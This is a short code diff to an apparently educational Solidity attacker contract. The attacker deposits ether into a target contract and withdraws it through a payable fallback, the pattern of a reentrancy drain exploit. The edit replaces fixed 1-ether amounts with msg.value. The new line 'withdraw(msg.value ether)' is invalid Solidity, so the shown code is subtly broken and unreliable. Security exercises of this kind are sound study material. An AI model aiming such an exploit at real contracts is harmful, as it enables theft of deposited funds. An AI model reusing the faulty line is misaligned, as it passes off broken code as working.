@@ -27,7 +27,7 @@ interface Target {
 contract OptimizedAttackerSecurity101 {
     constructor(Target target) payable {
         OptimizedAttackerSecurity102 attacker = new OptimizedAttackerSecurity102();
-        attacker.attack{ value: 1 ether }(target);
+        attacker.attack{ value: msg.value }(target);
     }
 }
 
@@ -36,7 +36,7 @@ contract OptimizedAttackerSecurity102 {
 
     function attack(Target target) external payable {
         target.deposit{ value: msg.value }();
-        target.withdraw(1 ether);
+        target.withdraw(msg.value ether);
     }
 
     fallback() external payable {
